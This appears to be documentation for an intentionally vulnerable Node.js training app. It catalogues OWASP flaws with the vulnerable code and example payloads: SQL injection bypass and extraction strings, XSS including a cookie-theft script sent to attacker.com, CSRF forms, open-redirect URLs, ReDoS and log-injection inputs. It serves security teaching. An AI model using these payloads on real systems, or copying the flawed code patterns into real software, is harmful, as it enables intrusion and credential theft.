---
author: Vulnerable Node Documentation Team
description: Comprehensive vulnerability documentation for security research and training
last_changed: 2025-11-27
---

# Vulnerability Documentation

## Table of Contents

- [Overview](#overview)
- [OWASP Top 10 Vulnerabilities](#owasp-top-10-vulnerabilities)
- [A1 - Injection](#a1---injection)
- [A2 - Broken Authentication and Session Management](#a2---broken-authentication-and-session-management)
- [A3 - Cross-Site Scripting (XSS)](#a3---cross-site-scripting-xss)
- [A4 - Insecure Direct Object References](#a4---insecure-direct-object-references)
- [A5 - Security Misconfiguration](#a5---security-misconfiguration)
- [A6 - Sensitive Data Exposure](#a6---sensitive-data-exposure)
- [A8 - Cross-Site Request Forgery (CSRF)](#a8---cross-site-request-forgery-csrf)
- [A10 - Unvalidated Redirects and Forwards](#a10---unvalidated-redirects-and-forwards)
- [Additional Vulnerabilities](#additional-vulnerabilities)
- [Summary Table](#summary-table)

## Overview

This document provides detailed information about the intentional security vulnerabilities present in the vulnerable-node application. Each vulnerability is mapped to the OWASP Top 10 classification and includes:

- Vulnerability description
- Affected code locations
- Attack vectors
- Example payloads

> [!CAUTION]
> These vulnerabilities are intentional and exist for educational purposes. Never use similar patterns in production code.

## OWASP Top 10 Vulnerabilities

The application contains vulnerabilities from the OWASP Top 10 (2013):

```mermaid
pie title Vulnerability Distribution
    "A1 - Injection" : 5
    "A2 - Auth Issues" : 3
    "A3 - XSS" : 2
    "A4 - IDOR" : 1
    "A5 - Misconfiguration" : 2
    "A6 - Data Exposure" : 2
    "A8 - CSRF" : 1
    "A10 - Redirects" : 1
```

## A1 - Injection

### SQL Injection in Authentication

**Location:** `model/auth.js` (Line 7)

**Vulnerable Code:**

```javascript
function do_auth(username, password) {
    var db = pgp(config.db.connectionString);

    // Line 7 - SQL Injection vulnerability
    var q = "SELECT * FROM users WHERE name = '" + username + "' AND password ='" + password + "';";

    return db.one(q);
}
```

**Issue:** User input is directly concatenated into the SQL query without sanitization or parameterized queries.

**Attack Vector:**

- **Endpoint:** `POST /login/auth`
- **Parameters:** `username`, `password`

**Example Payloads:**

```sql
-- Bypass authentication
username: admin'--
password: anything

-- Authentication bypass (alternative)
username: ' OR '1'='1'--
password: anything

-- Union-based extraction
username: ' UNION SELECT name, password FROM users--
password: anything
```

### SQL Injection in Product Search

**Location:** `model/products.js` (Line 21)

**Vulnerable Code:**

```javascript
function search(query) {
    // Line 21 - SQL Injection vulnerability
    var q = "SELECT * FROM products WHERE name ILIKE '%" + query + "%' OR description ILIKE '%" + query + "%';";

    return db.many(q);
}
```

**Attack Vector:**

- **Endpoint:** `GET /products/search`
- **Parameter:** `q`

**Example Payloads:**

```sql
-- Extract all products
%'; SELECT * FROM products;--

-- Union-based attack to extract users
%' UNION SELECT 1, name, password, 4, '5' FROM users--
```

### SQL Injection in Product Detail

**Location:** `model/products.js` (Line 14)

**Vulnerable Code:**

```javascript
function getProduct(product_id) {
    // Line 14 - SQL Injection vulnerability
    var q = "SELECT * FROM products WHERE id = '" + product_id + "';";

    return db.one(q);
}
```

**Attack Vector:**

- **Endpoint:** `GET /products/detail`
- **Parameter:** `id`

**Example Payload:**

```sql
-- Boolean-based blind SQL injection
1' AND '1'='1
1' AND '1'='2

-- Time-based blind injection
1'; SELECT pg_sleep(5);--
```

### SQL Injection in Purchase

**Location:** `model/products.js` (Lines 29-38)

**Vulnerable Code:**

```javascript
function purchase(cart) {
    // Lines 29-38 - SQL Injection vulnerability
    var q = "INSERT INTO purchases(...) VALUES('" +
            cart.mail + "', '" +
            cart.product_name + "', '" +
            // ... other fields concatenated directly
            "');";

    return db.one(q);
}
```

**Attack Vector:**

- **Endpoint:** `POST /products/buy` or `GET /products/buy`
- **Parameters:** All purchase form fields

### SQL Injection in Purchased Products

**Location:** `model/products.js` (Line 46)

**Vulnerable Code:**

```javascript
function get_purcharsed(username) {
    // Line 46 - SQL Injection vulnerability
    var q = "SELECT * FROM purchases WHERE user_name = '" + username + "';";

    return db.many(q);
}
```

> [!NOTE]
> This vulnerability requires session manipulation to exploit, as `username` comes from the session.

## A2 - Broken Authentication and Session Management

### Weak Session Configuration

**Location:** `app.js` (Lines 43-49)

**Vulnerable Code:**

```javascript
app.use(session({
  secret: 'ñasddfilhpaf78h78032h780g780fg780asg780dsbovncubuyvqy',
  cookie: {
    secure: false,
    maxAge: 99999999999
  }
}));
```

**Issues:**

1. **Hardcoded secret** - Session secret is hardcoded in source code
2. **Non-secure cookies** - `secure: false` allows cookies over HTTP
3. **Excessive session lifetime** - ~3170 years maxAge enables persistent sessions

### Plain Text Password Storage

**Location:** Database design and `model/init_db.js`

**Issue:** Passwords are stored in plain text without hashing.

```sql
CREATE TABLE users(name VARCHAR(100) PRIMARY KEY, password VARCHAR(50));
```

**Impact:** Database breach exposes all user credentials directly.

### Insufficient Login Protection

**Location:** `routes/login.js`

**Issues:**

1. No rate limiting on login attempts
2. No account lockout mechanism
3. No CAPTCHA protection
4. Verbose error messages aid attackers

## A3 - Cross-Site Scripting (XSS)

### Reflected XSS in Search Results

**Location:** `views/search.ejs` (Lines 1-3)

**Vulnerable Code:**

```ejs
<h2>Results for: <%- in_query %></h2>
```

**Issue:** The `<%-` syntax in EJS outputs unescaped HTML. User input in `in_query` is rendered without sanitization.

**Attack Vector:**

- **Endpoint:** `GET /products/search`
- **Parameter:** `q`

**Example Payloads:**

```html
<!-- Simple alert -->
<script>alert('XSS')</script>

<!-- Cookie theft -->
<script>document.location='http://attacker.com/?c='+document.cookie</script>

<!-- DOM manipulation -->
<img src=x onerror="alert('XSS')">
```

### Stored/Reflected XSS in Product Display

**Location:** `views/search.ejs`, `views/product_detail.ejs`

**Vulnerable Code:**

```ejs
<td><%- products[i].name %></td>
<td><%- products[i].description %></td>
```

**Issue:** Product data displayed with unescaped output could contain malicious scripts if injected via SQL injection.

### XSS in Login Error Messages

**Location:** `views/login.ejs` (Lines 21-23)

**Vulnerable Code:**

```ejs
<% if (auth_error != undefined) { %>
<span class="label label-danger"><%-auth_error%></span>
<% } %>
```

**Issue:** Error messages are displayed without escaping.

## A4 - Insecure Direct Object References

### Product ID Enumeration

**Location:** `routes/products.js` (Lines 41-58)

**Vulnerable Code:**

```javascript
router.get('/products/detail', function(req, res, next) {
    var url_params = url.parse(req.url, true).query;
    var product_id = url_params.id;

    db_products.getProduct(product_id)
        // ...
});
```

**Issue:** No authorization check to verify user should access the requested product. Any user can access any product by changing the `id` parameter.

**Attack Vector:**

```
GET /products/detail?id=1
GET /products/detail?id=2
GET /products/detail?id=999
```

## A5 - Security Misconfiguration

### Exposed Stack Traces

**Location:** `app.js` (Lines 68-76)

**Vulnerable Code:**

```javascript
if (app.get('env') === 'development') {
  app.use(function(err, req, res, next) {
    res.status(err.status || 500);
    res.render('error', {
      message: err.message,
      error: err  // Full error object with stack trace
    });
  });
}
```

**Issue:** Development error handler exposes full stack traces to users.

### Insecure Default Credentials

**Location:** `dummy.js`

**Issue:** Default credentials are well-known and documented:

- `admin:admin`
- `roberto:asdfpiuw981`

### Missing Security Headers

**Issue:** The application lacks security headers:

- No `Content-Security-Policy`
- No `X-Frame-Options`
- No `X-Content-Type-Options`
- No `X-XSS-Protection`
- No `Strict-Transport-Security`

## A6 - Sensitive Data Exposure

### Plain Text Passwords in Database

**Location:** `model/init_db.js`, `dummy.js`

**Issue:** Passwords stored without encryption or hashing.

### Credentials in Source Code

**Location:** `config.js`

**Vulnerable Code:**

```javascript
var config_docker = {
    "db": {
        "server": "postgres://postgres:postgres@postgres_db",
        "database": "vulnerablenode"
    }
}
```

**Issue:** Database credentials hardcoded in source code.

### Session Secret Exposure

**Location:** `app.js` (Line 44)

**Issue:** Session secret hardcoded in source, allowing session token forgery if source is compromised.

## A8 - Cross-Site Request Forgery (CSRF)

### Unprotected Purchase Endpoint

**Location:** `routes/products.js` (Lines 89-145)

**Vulnerable Code:**

```javascript
router.all('/products/buy', function(req, res, next) {
    // No CSRF token validation
    // Accepts both GET and POST requests
    // ...
});
```

**Issues:**

1. No CSRF token generation or validation
2. Accepts GET requests for state-changing operations
3. Session cookie sent automatically with requests

**Attack Vector:**

An attacker can create a malicious page that submits purchase requests:

```html
<img src="http://vulnerable-node:3000/products/buy?mail=attacker@evil.com&product_id=1&price=1€" />

<!-- Or using a form -->
<form action="http://vulnerable-node:3000/products/buy" method="POST">
    <input type="hidden" name="mail" value="attacker@evil.com" />
    <input type="hidden" name="product_id" value="1" />
    <!-- ... -->
</form>
<script>document.forms[0].submit();</script>
```

## A10 - Unvalidated Redirects and Forwards

### Open Redirect in Login

**Location:** `routes/login.js` (Lines 32-36)

**Vulnerable Code:**

```javascript
if (returnurl == undefined || returnurl == ""){
    returnurl = "/";
}

res.redirect(returnurl);
```

**Issue:** The `returnurl` parameter is not validated, allowing redirection to external sites.

**Attack Vector:**

```
GET /login?returnurl=http://evil.com/phishing
```

After successful login, user is redirected to attacker-controlled site.

**Example Exploit:**

```
http://vulnerable-node:3000/login?returnurl=http://attacker.com/steal-credentials
```

## Additional Vulnerabilities

### Regular Expression Denial of Service (ReDoS)

**Location:** `routes/products.js` (Lines 120-122)

**Vulnerable Code:**

```javascript
// Line 120 - Vulnerable regex pattern
var re = /^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/
if (!re.test(cart.mail)){
    throw new Error("Invalid mail format");
}
```

**Issue:** The regular expression contains nested quantifiers that cause catastrophic backtracking.

**Attack Payload:**

```
mail=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

**Impact:** Server becomes unresponsive while processing the regex.

### Log Injection

**Location:** `routes/login.js` (Line 25)

**Vulnerable Code:**

```javascript
logger.error("Tried to login attempt from user = " + user);
```

**Issue:** User input is logged without sanitization.

**Attack Payload:**

```
username=admin\n[ERROR] Fake log entry\n[INFO]
```

**Impact:** Attacker can forge log entries or inject malicious content.

### Information Disclosure via Error Messages

**Location:** `routes/login.js` (Line 39)

**Vulnerable Code:**

```javascript
res.redirect("/login?returnurl=" + returnurl + "&error=" + err.message);
```

**Issue:** Database error messages exposed to users, revealing system information.

## Summary Table

| Vulnerability | OWASP | Location | Severity |
|---------------|-------|----------|----------|
| SQL Injection (Auth) | A1 | `model/auth.js:7` | Critical |
| SQL Injection (Search) | A1 | `model/products.js:21` | High |
| SQL Injection (Product) | A1 | `model/products.js:14` | High |
| SQL Injection (Purchase) | A1 | `model/products.js:29-38` | High |
| SQL Injection (Purchased) | A1 | `model/products.js:46` | Medium |
| Weak Session Config | A2 | `app.js:43-49` | Medium |
| Plain Text Passwords | A2/A6 | `model/init_db.js` | Critical |
| XSS (Search) | A3 | `views/search.ejs:3` | High |
| XSS (Product Display) | A3 | `views/search.ejs`, `views/product_detail.ejs` | Medium |
| XSS (Login Error) | A3 | `views/login.ejs:22` | Medium |
| IDOR (Products) | A4 | `routes/products.js:41-58` | Low |
| Stack Traces Exposed | A5 | `app.js:68-76` | Low |
| Default Credentials | A5 | `dummy.js` | Medium |
| Hardcoded Secrets | A6 | `config.js`, `app.js:44` | Medium |
| CSRF (Purchase) | A8 | `routes/products.js:89` | High |
| Open Redirect | A10 | `routes/login.js:36` | Medium |
| ReDoS | - | `routes/products.js:120` | Medium |
| Log Injection | - | `routes/login.js:25` | Low |

## Related Documentation

- [Architecture Overview](./ARCHITECTURE.md) - System architecture documentation
- [Attack Examples](./ATTACKS.md) - How to exploit these vulnerabilities
- [Contributing Guide](../CONTRIBUTING.md) - How to contribute to the project
